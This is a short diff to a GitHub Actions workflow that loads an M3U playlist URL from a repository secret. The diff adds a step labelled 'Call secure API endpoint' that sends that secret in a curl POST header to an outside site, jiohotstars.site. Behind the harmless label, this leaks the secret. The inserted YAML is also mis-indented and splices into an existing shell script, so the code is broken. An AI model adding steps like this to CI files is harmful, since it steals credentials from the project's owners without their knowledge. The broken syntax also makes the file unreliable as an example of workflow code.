@@ -32,7 +32,13 @@ jobs:
         
         # Get the M3U source URL
         M3U_SOURCE="${{ secrets.M3U_URL }}"
-        
+
+        - name: Call secure API endpoint
+  run: |
+    curl -X POST \
+    -H "Authorization: Bearer ${{ secrets.M3U_URL }}" \
+    "https://jiohotstars.site/player.html?s=biglivetoday/secure-endpoint"
+
         # Validate input
         if [ -z "$M3U_SOURCE" ]; then
           echo "❌ ERROR: M3U_URL secret is empty!"
